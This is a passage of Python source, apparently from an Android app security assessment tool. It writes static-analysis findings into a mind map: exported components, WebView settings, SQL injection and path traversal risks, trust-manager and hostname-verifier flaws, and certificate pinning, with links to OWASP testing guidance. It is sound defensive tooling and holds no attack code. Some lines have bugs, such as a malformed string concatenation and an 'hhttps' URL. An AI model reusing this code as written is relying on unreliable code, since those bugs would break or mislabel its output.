        informationGatheringTopic = TopicElement()
        informationGatheringTopic.setTitle(""Information Gathering"")

        methodologyTopic = TopicElement()
        methodologyTopic.setTitle(""Methodology"")


        # Properties Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Properties"")
        informationGatheringTopic.addSubTopic(topicElement)
        subtopics = [""Version Name"" ,""Version Code"" ,""SHA 256"" ,""Minimum SDK Version"",""Target SDK Version"" ,""Xamarin"" ,""Cordova""
                     ,""Outsystems"" ,""Backup Enabled"" ,""Multiple Dex Classes"" ,""Secret Codes""]
        self.createSubTopics(informationGatheringTopic.getSubTopicByIndex(0) ,subtopics)
        topicElement = TopicElement()
        topicElement.setTitle(self.app.getVersionName())
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(0).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement.setTitle(self.app.getVersionCode())
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(1).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement.setTitle(self.app.getSHA256())
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(2).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement.setTitle \
            (self.app.getMinSDKVersion( ) +"" ( "" +self.app.getCodeName(self.app.getMinSDKVersion() ) +"")"")
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(3).addSubTopic(topicElement)

        topicElement = TopicElement()
        topicElement.setTitle \
            (self.app.getTargetSDKVersion() + "" ( "" + self.app.getCodeName(self.app.getTargetSDKVersion()) + "")"")
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(4).addSubTopic(topicElement)

        topicElement = TopicElement()
        topicElement.setTitle(self.app.isXamarin())
        if self.app.isXamarin() == ""Yes"":
            bundledTopic = TopicElement()
            bundledTopic.setTitle(""Bundled?"")
            bundledValue = TopicElement()
            bundledValue.setTitle(self.app.isXamarinBundled())
            bundledTopic.addSubTopic(bundledValue)
            topicElement.addSubTopic(bundledTopic)
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(5).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement.setTitle(self.app.isCordova())
        if (self.app.isCordova() == ""Yes""):
            if (len(self.app.getCordovaPlugins())) > 0:
                cordovaPluginsTopic = TopicElement()
                cordovaPluginsTopic.setTitle(""Plugins"")
                self.createSubTopics(cordovaPluginsTopic,self.app.getCordovaPlugins())
                topicElement.addSubTopic(cordovaPluginsTopic)
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(6).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement.setTitle(self.app.isOutsystems())
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(7).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement = TopicElement()
        topicElement.setTitle(self.app.isBackupEnabled())
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(8).addSubTopic(topicElement)
        topicElement = TopicElement()
        topicElement.setTitle(self.app.isMultiDex())
        informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(9).addSubTopic(topicElement)
        topicElement = TopicElement()
        if len(self.app.getSecretCodes()) >0:
            self.createSubTopics(topicElement, self.app.getSecretCodes())
            informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(10).addSubTopic(topicElement)
        else:
            topicElement.setTitle(""No"")
            informationGatheringTopic.getSubTopicByIndex(0).getSubTopicByIndex(10).addSubTopic(topicElement)

        # Permissions Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Permissions"")
        informationGatheringTopic.addSubTopic(topicElement)
        self.createSubTopics(informationGatheringTopic.getSubTopicByIndex(1) ,self.app.getPermissions())
        if len(self.app.getPermissions()) > self.configuration.getXmindTopipFoldAt():
            topicElement.setFolded()


        # Exported Components Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Exported Components"")
        informationGatheringTopic.addSubTopic(topicElement)
        subtopics = [""Activities"" ,""Broadcast Receivers"" ,""Content Providers"" ,""Services""]
        self.createSubTopics(informationGatheringTopic.getSubTopicByIndex(2) ,subtopics)
        for activity in self.app.getExportedActivities():
            topicElement = TopicElement()
            topicElement.setTitle(activity)
            if self.app.getComponentPermission(activity) != """":
                permissionTopic = TopicElement()
                permissionTopic.setTitle(""Permission: ""+self.app.getComponentPermission(activity))
                topicElement.addSubTopic(permissionTopic)
            try:
	        filters = self.app.getIntentFiltersList()[activity]
	        i = 1
	        for filter in filters:
	            intentTopic = TopicElement()
	            intentTopic.setTitle(""Intent Filter ""+str(i))
	            i+=1
	            action = TopicElement()
	            action.setTitle(""Action"")
	            self.createSubTopics(action, filter.getActionList())
	            category = TopicElement()
	            category.setTitle(""Categories"")
	            self.createSubTopics(category,filter.getCategoryList())
	            data = TopicElement()
	            data.setTitle(""Data"")
	            self.createSubTopics(data, filter.getDataList())
	            intentTopic.addSubTopic(action)
	            intentTopic.addSubTopic(category)
	            intentTopic.addSubTopic(data)
	            intentTopic.setFolded()
	            topicElement.addSubTopic(intentTopic)
            except:
                pass
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(0).addSubTopic(topicElement)
        if len(self.app.getExportedActivities()) > self.configuration.getXmindTopipFoldAt():
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(0).setFolded()
        for receiver in self.app.getExportedReceivers():
            topicElement = TopicElement()
            topicElement.setTitle(receiver)
            if self.app.getComponentPermission(receiver) != """":
                permissionTopic = TopicElement()
                permissionTopic.setTitle(""Permission: ""+self.app.getComponentPermission(receiver))
                topicElement.addSubTopic(permissionTopic)
            try:
                filters = self.app.getIntentFiltersList()[receiver]
                i = 1
                for filter in filters:
                    intentTopic = TopicElement()
                    intentTopic.setTitle(""Intent Filter "" + str(i))
                    i += 1
                    action = TopicElement()
                    action.setTitle(""Action"")
                    self.createSubTopics(action, filter.getActionList())
                    category = TopicElement()
                    category.setTitle(""Categories"")
                    self.createSubTopics(category, filter.getCategoryList())
                    data = TopicElement()
                    data.setTitle(""Data"")
                    self.createSubTopics(data, filter.getDataList())
                    intentTopic.addSubTopic(action)
                    intentTopic.addSubTopic(category)
                    intentTopic.addSubTopic(data)
                    intentTopic.setFolded()
                    topicElement.addSubTopic(intentTopic)
            except:
                pass
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(1).addSubTopic(topicElement)
        if len(self.app.smaliChecks.getDynamicRegisteredBroadcastReceiversLocations()) > 0:
            dynamicRegisteredBroadcastReceiverTopic = TopicElement()
            dynamicRegisteredBroadcastReceiverTopic.setTitle(""Dynamically Registered"")
            self.createSubTopics(dynamicRegisteredBroadcastReceiverTopic,self.app.smaliChecks.getDynamicRegisteredBroadcastReceiversLocations())
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(1).addSubTopic(dynamicRegisteredBroadcastReceiverTopic)
            if len(self.app.smaliChecks.getDynamicRegisteredBroadcastReceiversLocations()) > self.configuration.getXmindTopipFoldAt():
                dynamicRegisteredBroadcastReceiverTopic.setFolded()

        if len(self.app.getExportedReceivers()) > self.configuration.getXmindTopipFoldAt():
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(1).setFolded()
        for provider in self.app.getExportedProviders():
            topicElement = TopicElement()
            topicElement.setTitle(provider)
            if self.app.getComponentPermission(provider) != """":
                permissionTopic = TopicElement()
                permissionTopic.setTitle(""Permission: ""+self.app.getComponentPermission(provider))
                topicElement.addSubTopic(permissionTopic)
            try:
                filters = self.app.getIntentFiltersList()[provider]
                i = 1
                for filter in filters:
                    intentTopic = TopicElement()
                    intentTopic.setTitle(""Intent Filter "" + str(i))
                    i += 1
                    action = TopicElement()
                    action.setTitle(""Action"")
                    self.createSubTopics(action, filter.getActionList())
                    category = TopicElement()
                    category.setTitle(""Categories"")
                    self.createSubTopics(category, filter.getCategoryList())
                    data = TopicElement()
                    data.setTitle(""Data"")
                    self.createSubTopics(data, filter.getDataList())
                    intentTopic.addSubTopic(action)
                    intentTopic.addSubTopic(category)
                    intentTopic.addSubTopic(data)
                    intentTopic.setFolded()
                    topicElement.addSubTopic(intentTopic)
            except:
                pass
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(2).addSubTopic(topicElement)
        if len(self.app.getExportedProviders()) > self.configuration.getXmindTopipFoldAt():
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(2).setFolded()
        for service in self.app.getExportedServices():
            topicElement = TopicElement()
            topicElement.setTitle(service)
            if self.app.getComponentPermission(service) != """":
                permissionTopic = TopicElement()
                permissionTopic.setTitle(""Permission: ""+self.app.getComponentPermission(service))
                topicElement.addSubTopic(permissionTopic)
            try:
                filters = self.app.getIntentFiltersList()[service]
                i = 1
                for filter in filters:
                    intentTopic = TopicElement()
                    intentTopic.setTitle(""Intent Filter "" + str(i))
                    i += 1
                    action = TopicElement()
                    action.setTitle(""Action"")
                    self.createSubTopics(action, filter.getActionList())
                    category = TopicElement()
                    category.setTitle(""Categories"")
                    self.createSubTopics(category, filter.getCategoryList())
                    data = TopicElement()
                    data.setTitle(""Data"")
                    self.createSubTopics(data, filter.getDataList())
                    intentTopic.addSubTopic(action)
                    intentTopic.addSubTopic(category)
                    intentTopic.addSubTopic(data)
                    intentTopic.setFolded()
                    topicElement.addSubTopic(intentTopic)
            except:
                pass
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(3).addSubTopic(topicElement)
        if len(self.app.getExportedServices()) > self.configuration.getXmindTopipFoldAt():
            informationGatheringTopic.getSubTopicByIndex(2).getSubTopicByIndex(3).setFolded()

        # Files Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Files"")
        topicElement.setPlainNotes(""Excluded files/locations: ""+self.configuration.getFileExclusions())
        fileTypes = [""Assets"" ,""Libs"" ,""Raw Resources"" ,""Dex Classes"" ,""Cordova Files"",""Xamarin Assemblies"",""Other""]
        tooManySubtopicsElement = TopicElement()
        tooManySubtopicsElement.setTitle(""Too many files. Hit configured threshold."")
        self.createSubTopics(topicElement ,fileTypes)
        self.createSubTopics(topicElement.getSubTopicByIndex(0) ,self.app.getAssets())
        if len(self.app.getAssets()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(0).setFolded()
        if len(self.app.getLibs()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(1).setFolded()
        if len(self.app.getRawResources()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(2).setFolded()
        if len(self.app.getCordovaFiles()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(4).setFolded()
        if len(self.app.getXamarinAssemblies()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(5).setFolded()
        if len(self.app.getOtherFiles()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(6).setFolded()
        self.createSubTopics(topicElement.getSubTopicByIndex(1) ,self.app.getLibs())
        self.createSubTopics(topicElement.getSubTopicByIndex(2) ,self.app.getRawResources())
        self.createSubTopics(topicElement.getSubTopicByIndex(3), self.app.getDexFiles())
        self.createSubTopics(topicElement.getSubTopicByIndex(4), self.app.getCordovaFiles())
        self.createSubTopics(topicElement.getSubTopicByIndex(5), self.app.getXamarinAssemblies())
        if len(self.app.getOtherFiles()) <= self.app.configuration.getMaxSubTopics():
            self.createSubTopics(topicElement.getSubTopicByIndex(6), self.app.getOtherFiles())
        else:
            topicElement.getSubTopicByIndex(6).addSubTopic(tooManySubtopicsElement)
        informationGatheringTopic.addSubTopic(topicElement)

        # Object Usage Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Object Usage"")
        objectsSubTopics = [""WebViews loadUrl"",""Cryptographic Functions"", ""Custom""]
        self.createSubTopics(topicElement, objectsSubTopics)

        if len(self.app.smaliChecks.getWebViewsLoadUrlUsageLocations()) > self.configuration.getXmindTopipFoldAt():
            topicElement.getSubTopicByIndex(0).setFolded()


        self.createSubTopics(topicElement.getSubTopicByIndex(0),self.app.smaliChecks.getWebViewsLoadUrlUsageLocations())
        encryptionSubTopic = TopicElement()
        encryptionSubTopic.setTitle(""Encryption"")
        self.createSubTopics(encryptionSubTopic, self.app.smaliChecks.getEncryptionFunctionsLocations())
        if (len(self.app.smaliChecks.getEncryptionFunctionsLocations()) > self.configuration.getXmindTopipFoldAt()):
            encryptionSubTopic.setFolded()

        decryptionSubtopic = TopicElement()
        decryptionSubtopic.setTitle(""Decryption"")
        self.createSubTopics(decryptionSubtopic, self.app.smaliChecks.getDecryptionFunctionsLocations())
        if (len(self.app.smaliChecks.getDecryptionFunctionsLocations()) > self.configuration.getXmindTopipFoldAt()):
            decryptionSubtopic.setFolded()

        undeterminedSubtopic = TopicElement()
        undeterminedSubtopic.setTitle(""Undetermined"")
        self.createSubTopics(undeterminedSubtopic, self.app.smaliChecks.getUndeterminedCryptographicFunctionsLocations())
        if (len(self.app.smaliChecks.getUndeterminedCryptographicFunctionsLocations()) > self.configuration.getXmindTopipFoldAt()):
            undeterminedSubtopic.setFolded()


        topicElement.getSubTopicByIndex(1).addSubTopic(encryptionSubTopic)
        topicElement.getSubTopicByIndex(1).addSubTopic(decryptionSubtopic)
        topicElement.getSubTopicByIndex(1).addSubTopic(undeterminedSubtopic)
        informationGatheringTopic.addSubTopic(topicElement)


        if len(self.app.smaliChecks.getCustomChecksLocations()) > 0:
            for check in self.app.smaliChecks.getCustomChecksLocations():
                customCheckSubTopic = TopicElement()
                customCheckSubTopic.setTitle(check)
                self.createSubTopics(customCheckSubTopic,self.app.smaliChecks.getCustomChecksLocations()[check])
                topicElement.getSubTopicByIndex(2).addSubTopic(customCheckSubTopic)
            if len(self.app.smaliChecks.getCustomChecksLocations()[check]) > self.configuration.getXmindTopipFoldAt():
                customCheckSubTopic.setFolded()


        # Improper Platform Usage


        topicElement = TopicElement()
        topicElement.setTitle(""Improper Platform Usage"")
        ipSubTopics = [""Malicious interaction possible with exported components?""]
        self.createSubTopics(topicElement ,ipSubTopics)
        topicElement.getSubTopicByIndex(0).setURLHyperlink \
            (""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-for-sensitive-functionality-exposure-through-ipc"")

        if(len(self.app.smaliChecks.getVulnerableContentProvidersSQLiLocations()) > 0):
            contentProviderSQLi = TopicElement()
            contentProviderSQLi.addMarker('flag-yellow')
            contentProviderSQLi.setTitle(""Possibility of SQL Injection in exported ContentProvider"")
            self.createSubTopics(contentProviderSQLi,self.app.smaliChecks.getVulnerableContentProvidersSQLiLocations())
            topicElement.addSubTopic(contentProviderSQLi)

        if (len(self.app.smaliChecks.getVulnerableContentProvidersPathTraversalLocations()) > 0):
            contentProviderPathTraversal = TopicElement()
            contentProviderPathTraversal.addMarker('flag-yellow')
            contentProviderPathTraversal.setTitle(""Possibility of Path Traversal in exported ContentProvider"")
            self.createSubTopics(contentProviderPathTraversal, self.app.smaliChecks.getVulnerableContentProvidersPathTraversalLocations())
            topicElement.addSubTopic(contentProviderPathTraversal)



        debuggableEvidenceTopic = TopicElement()
        debuggableEvidenceTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master//Document/0x05i-Testing-Code-Quality-and-Build-Settings.md#testing-if-the-app-is-debuggable"")
        if self.app.isDebuggable() == ""Yes"":
            debuggableEvidenceTopic.setTitle(""Application is debuggable"")
            debuggableEvidenceTopic.addMarker('flag-red')
            debuggableEvidenceTopic.setURLHyperlink(
                ""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05i-Testing-Code-Quality-and-Build-Settings.md#testing-if-the-app-is-debuggable"")
        else:
            debuggableEvidenceTopic.setTitle(""Application is not debuggable"")
            debuggableEvidenceTopic.addMarker('flag-green')
        topicElement.addSubTopic(debuggableEvidenceTopic)

        activitiesVulnerableToPreferences = TopicElement()
        activitiesVulnerableToPreferences.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-for-fragment-injection"")
        if len(self.app.getActivitiesExtendPreferencesWithoutValidate()) != 0 and int(self.app.getMinSDKVersion()) < 19:
            activitiesVulnerableToPreferences.setTitle(""Activities vulnerable to Fragment Injection"")
            self.createSubTopics(activitiesVulnerableToPreferences,self.app.getActivitiesExtendPreferencesWithoutValidate())
            activitiesVulnerableToPreferences.addMarker('flag-red')
        if len(self.app.getActivitiesExtendPreferencesWithValidate()) != 0:
            activitiesVulnerableToPreferences.setTitle(""Activities with possible Fragment Injection (isValidFragment in place)"")
            self.createSubTopics(activitiesVulnerableToPreferences, self.app.getActivitiesExtendPreferencesWithValidate())
            activitiesVulnerableToPreferences.addMarker('flag-yellow')
        if len(self.app.getActivitiesExtendPreferencesWithoutValidate()) == 0 and len(self.app.getActivitiesExtendPreferencesWithValidate()) == 0:
            activitiesVulnerableToPreferences.setTitle(""No activities vulnerable to Fragment Injection"")
            activitiesVulnerableToPreferences.addMarker('flag-green')
        topicElement.addSubTopic(activitiesVulnerableToPreferences)
        addJavascriptInterfaceTopic = TopicElement()
        if len(self.app.smaliChecks.getWebviewAddJavascriptInterfaceLocations()) != 0:
            if int(self.app.getMinSDKVersion()) <= 16:
                addJavascriptInterfaceTopic.setTitle(""JavascriptInterface with RCE possibility"")
                addJavascriptInterfaceTopic.addMarker('flag-red')
            else:
                addJavascriptInterfaceTopic.setTitle(""JavascriptInterface available."")
                addJavascriptInterfaceTopic.addMarker('flag-yellow')
            self.createSubTopics(addJavascriptInterfaceTopic,self.app.smaliChecks.getWebviewAddJavascriptInterfaceLocations())
            if len(self.app.smaliChecks.getWebviewAddJavascriptInterfaceLocations()) > self.configuration.getXmindTopipFoldAt():
                addJavascriptInterfaceTopic.setFolded()
        else:
            addJavascriptInterfaceTopic.setTitle(""No presence of JavascriptInterface"")
            addJavascriptInterfaceTopic.addMarker('flag-green')
        addJavascriptInterfaceTopic.setURLHyperlink(
            ""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#determining-whether-java-objects-are-exposed-through-webviews"")
        topicElement.addSubTopic(addJavascriptInterfaceTopic)

        javascriptEnabledWebviewTopic = TopicElement()
        javascriptEnabledWebviewTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#determining-whether-java-objects-are-exposed-through-webviews"")
        if len(self.app.smaliChecks.getJavascriptEnabledWebViews()) > 0:
            javascriptEnabledWebviewTopic.setTitle(""WebView with Javascript enabled."")
            self.createSubTopics(javascriptEnabledWebviewTopic,self.app.smaliChecks.getJavascriptEnabledWebViews())
            javascriptEnabledWebviewTopic.addMarker('flag-yellow')
            if len(self.app.smaliChecks.getJavascriptEnabledWebViews()) > self.configuration.getXmindTopipFoldAt():
                javascriptEnabledWebviewTopic.setFolded()
        else:
            javascriptEnabledWebviewTopic.setTitle(""No WebView with Javascript enabled."")
            javascriptEnabledWebviewTopic.addMarker('flag-green')
        topicElement.addSubTopic(javascriptEnabledWebviewTopic)
        fileAccessEnabledWebviewTopic = TopicElement()
        fileAccessEnabledWebviewTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-webview-protocol-handlers"")
        if len(self.app.smaliChecks.getFileAccessEnabledWebViews()) > 0:
            fileAccessEnabledWebviewTopic.setTitle(""WebView with fileAccess enabled."")
            self.createSubTopics(fileAccessEnabledWebviewTopic, self.app.smaliChecks.getFileAccessEnabledWebViews())
            if int(self.app.getMinSDKVersion()) < 16:
                fileAccessEnabledWebviewTopic.setPlainNotes(""This app runs in versions bellow API 16 (Jelly Bean). If webview is opening local HTML files via file URL and loading external resources it might be possible to bypass Same Origin Policy and extract local files since AllowUniversalAccessFromFileURLs is enabled by default and there is not public API to disable it in this versions."")
                fileAccessEnabledWebviewTopic.addMarker('flag-yellow')
            else:
                fileAccessEnabledWebviewTopic.addMarker('flag-yellow')
            if len(self.app.smaliChecks.getFileAccessEnabledWebViews()) > self.configuration.getXmindTopipFoldAt():
                fileAccessEnabledWebviewTopic.setFolded()
        else:
            fileAccessEnabledWebviewTopic.setTitle(""No WebView with fileAccess enabled."")
            fileAccessEnabledWebviewTopic.addMarker('flag-green')
        topicElement.addSubTopic(fileAccessEnabledWebviewTopic)

        universalAccessEnabledWebviewTopic = TopicElement()
        if len(self.app.smaliChecks.getUniversalAccessFromFileURLEnabledWebviewsLocations()) > 0:
            self.createSubTopics(universalAccessEnabledWebviewTopic,self.app.smaliChecks.getUniversalAccessFromFileURLEnabledWebviewsLocations())
            universalAccessEnabledWebviewTopic.setTitle(""WebView with Universal Access from File URLs enabled."")
            universalAccessEnabledWebviewTopic.addMarker('flag-yellow')
        else:
            universalAccessEnabledWebviewTopic.setTitle(""No WebView with Universal Access from File URLs found."")
            universalAccessEnabledWebviewTopic.addMarker('flag-green')
        topicElement.addSubTopic(universalAccessEnabledWebviewTopic)

        methodologyTopic.addSubTopic(topicElement)



        # Insecure Communication Topic

        topicElement = TopicElement()
        topicElement.setTitle(""Insecure Communication"")
        icSubTopics = [""SSL Implementation"" ,""Mixed Mode Communication?""]
        self.createSubTopics(topicElement ,icSubTopics)
        sslSubTopics = [""Accepts self-sign certificates?"" ,""Accepts wrong host name?"" ,""Lack of Certificate Pinning?""]
        self.createSubTopics(topicElement.getSubTopicByIndex(0) ,sslSubTopics)

        trustManagerSubTopic = TopicElement()
        trustManagerSubTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#verifying-the-server-certificate"")
        if len(self.app.smaliChecks.getVulnerableTrustManagers()) != 0:
            trustManagerSubTopic.setTitle(""Vulnerable Trust Manager:"")
            self.createSubTopics(trustManagerSubTopic,self.app.smaliChecks.getVulnerableTrustManagers())
            topicElement.getSubTopicByIndex(0).addSubTopic(trustManagerSubTopic)
            trustManagerSubTopic.addMarker('flag-red')
        else:
            trustManagerSubTopic.setTitle(""No vulnerable Trust Manager found."")
            trustManagerSubTopic.addMarker('flag-green')
        topicElement.getSubTopicByIndex(0).addSubTopic(trustManagerSubTopic)

        sslErrorBypassSubTopic = TopicElement()
        sslErrorBypassSubTopic.setURLHyperlink(
            ""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#webview-server-certificate-verification"")
        if len(self.app.smaliChecks.getVulnerableWebViewSSLErrorBypass()) != 0:
            sslErrorBypassSubTopic.setTitle(""Webview with vulnerable SSL Implementation:"")
            sslErrorBypassSubTopic.addMarker('flag-red')
            self.createSubTopics(sslErrorBypassSubTopic,self.app.smaliChecks.getVulnerableWebViewSSLErrorBypass())
        else:
            sslErrorBypassSubTopic.setTitle(""No WebView with SSL Errror Bypass found."")
            sslErrorBypassSubTopic.addMarker('flag-green')
        topicElement.getSubTopicByIndex(0).addSubTopic(sslErrorBypassSubTopic)

        vulnerableHostnameVerifiersSubTopic = TopicElement()
        vulnerableHostnameVerifiersSubTopic.setURLHyperlink(
            ""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#hostname-verification"")
        if len(self.app.smaliChecks.getVulnerableHostnameVerifiers()) != 0:
            vulnerableHostnameVerifiersSubTopic.setTitle(""Vulnerable HostnameVerifier found"")
            vulnerableHostnameVerifiersSubTopic.addMarker('flag-red')
            self.createSubTopics(vulnerableHostnameVerifiersSubTopic,self.app.smaliChecks.getVulnerableHostnameVerifiers())
        else:
            vulnerableHostnameVerifiersSubTopic.setTitle(""No vulnerable HostnameVerifiers found."")
            vulnerableHostnameVerifiersSubTopic.addMarker('flag-green')
        topicElement.getSubTopicByIndex(0).addSubTopic(vulnerableHostnameVerifiersSubTopic)

        vulnerableSetHostnameVerifiersSubTopic = TopicElement()
        vulnerableSetHostnameVerifiersSubTopic.setURLHyperlink(
            ""hhttps://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#hostname-verification"")
        if len(self.app.smaliChecks.getVulnerableSetHostnameVerifier()) != 0:
            vulnerableSetHostnameVerifiersSubTopic.setTitle(""setHostnameVerifier call with ALLOW_ALL_HOSTNAMES_VERIFIER"")
            vulnerableSetHostnameVerifiersSubTopic.addMarker('flag-red')
            self.createSubTopics(vulnerableSetHostnameVerifiersSubTopic,self.app.smaliChecks.getVulnerableSetHostnameVerifier())
        else:
            vulnerableSetHostnameVerifiersSubTopic.setTitle(""No vulnerable setHostnameVerifiers found."")
            vulnerableSetHostnameVerifiersSubTopic.addMarker('flag-green')
        topicElement.getSubTopicByIndex(0).addSubTopic(vulnerableSetHostnameVerifiersSubTopic)

        vulnerableSocketsSubTopic = TopicElement()
        vulnerableSocketsSubTopic.setURLHyperlink(
            """")
        if len(self.app.smaliChecks.getVulnerableSockets()) != 0:
            vulnerableSocketsSubTopic.setTitle(
                ""Direct usage of Socket without HostnameVerifier"")
            vulnerableSocketsSubTopic.addMarker('flag-red')
            self.createSubTopics(vulnerableSocketsSubTopic,
                                 self.app.smaliChecks.getVulnerableSockets())
        else:
            vulnerableSocketsSubTopic.setTitle(""No direct usage of Socket without HostnameVerifiers."")
            vulnerableSocketsSubTopic.addMarker('flag-green')
        topicElement.getSubTopicByIndex(0).addSubTopic(vulnerableSocketsSubTopic)

        networkSecurityConfig = TopicElement()
        networkSecurityConfig.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#network-security-configuration"")
        if self.app.targetSDKVersion >= 25:
            if self.app.hasNetworkSecurityConfig == True:
                networkSecurityConfig.setTitle(
                    ""Usage of NetworkSecurityConfig file."")
                domains = self.app.getNetworkSecurityConfigDomains()
                for domain in domains:
                    domainTopic = TopicElement()
                    domainTopic.setTitle(','.join(domain['domains']))

                    clearTextAllowedTopic = TopicElement()
                    clearTextAllowedTopic.setTitle(""Clear Text Allowed"")
                    clearTextAllowedValueTopic = TopicElement()
                    if str(domain['allowClearText']) == ""True"":
                        clearTextAllowedValueTopic.setTitle(""Yes"")
                        clearTextAllowedValueTopic.addMarker('flag-red')
                    else:
                        clearTextAllowedValueTopic.setTitle(""No"")
                        clearTextAllowedValueTopic.addMarker('flag-green')
                    clearTextAllowedTopic.addSubTopic(clearTextAllowedValueTopic)

                    allowUserCATopic = TopicElement()
                    allowUserCATopic.setTitle(""User CA Trusted"")
                    allowUserCAValueTopic = TopicElement()
                    if str(domain['allowUserCA']) == ""True"":
                        allowUserCAValueTopic.setTitle(""Yes"")
                        allowUserCAValueTopic.addMarker('flag-red')
                    else:
                        allowUserCAValueTopic.setTitle(""No"")
                        allowUserCAValueTopic.addMarker('flag-green')
                    allowUserCATopic.addSubTopic(allowUserCAValueTopic)

                    pinningTopic = TopicElement()
                    pinningTopic.setTitle(""Pinning Configured"")
                    pinningValueTopic = TopicElement()
                    if str(domain['pinning']) == ""True"":
                        pinningValueTopic.setTitle(""Yes"")
                        pinningValueTopic.addMarker('flag-green')
                        pinningExpirationTopic = TopicElement()
                        pinningExpirationValueTopic = TopicElement()
                        pinningExpirationTopic.setTitle(""Pinning Expiration"")
                        if domain['pinningExpiration'] != '':
                            date_format = ""%Y-%m-%d""
                            a = datetime.strptime(domain['pinningExpiration'], date_format)
                            b = datetime.strptime(time.strftime(""%Y-%m-%d""), date_format)
                            days =  (a-b).days
                            pinningExpirationValueTopic.setTitle(domain['pinningExpiration'])
                            if days <=0:
                                pinningExpirationValueTopic.addMarker('flag-red')
                                pinningExpirationValueTopic.setPlainNotes('Certificate Pinning is disabled. The expiration date on the pin-set has been reached.')
                            elif days < 60:
                                pinningExpirationValueTopic.addMarker('flag-yellow')
                                pinningExpirationValueTopic.setPlainNotes(str+(days)+' days for Certificate Pinning to be disabled.')
                        else:
                            pinningExpirationValueTopic.setTitle(""No expiration"")
                        pinningExpirationTopic.addSubTopic(pinningExpirationValueTopic)
                        pinningTopic.addSubTopic(pinningExpirationTopic)
                    else:
                        pinningValueTopic.setTitle(""No"")
                        pinningValueTopic.addMarker('flag-yellow')
                    pinningTopic.addSubTopic(pinningValueTopic)

                    domainTopic.addSubTopic(clearTextAllowedTopic)
                    domainTopic.addSubTopic(allowUserCATopic)
                    domainTopic.addSubTopic(pinningTopic)
                    networkSecurityConfig.addSubTopic(domainTopic)

            else:
                networkSecurityConfig.setTitle(""No usage of NetworkSecurityConfig file."")
                networkSecurityConfig.addMarker('flag-yellow')
        else:
            networkSecurityConfig.setTitle(
                ""NetworkSecurityConfig check ignored."")
            networkSecurityConfig.addMarker('flag-green')
            networkSecurityConfig.setPlainNotes(""App is not targeting Android versions >= Nougat 7.0"")
        topicElement.getSubTopicByIndex(0).addSubTopic(networkSecurityConfig)

        certificatePinningTopic = TopicElement()
        certificatePinningTopic.setURLHyperlink(""https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05g-Testing-Network-Communication.md#testing-custom-certificate-stores-and-certificate-pinning"")
        if len(self.app.smaliChecks.getOkHTTPCertificatePinningLocations())>0 or len(self.app.smaliChecks.getCustomCertificatePinningLocations())>0:
            certificatePinningTopic.setTitle(""Possible Certificate Pinning Usage"")
            certificatePinningTopic.addMarker('flag-green')
            okHttpCertificatePinningTopic = TopicElement()
            if len(self.app.smaliChecks.getOkHTTPCertificatePinningLocations())>0:
                okHttpCertificatePinningTopic.setTitle(""OkHTTP Certificate Pinning."")
                self.createSubTopics(okHttpCertificatePinningTopic,self.app.smaliChecks.getOkHTTPCertificatePinningLocations())
                certificatePinningTopic.addSubTopic(okHttpCertificatePinningTopic)
            customCertificatePinningTopic = TopicElement()
            if len(self.app.smaliChecks.getCustomCertificatePinningLocations()) > 0:
                customCertificatePinningTopic.setTitle(""Custom Certificate Pinning"")
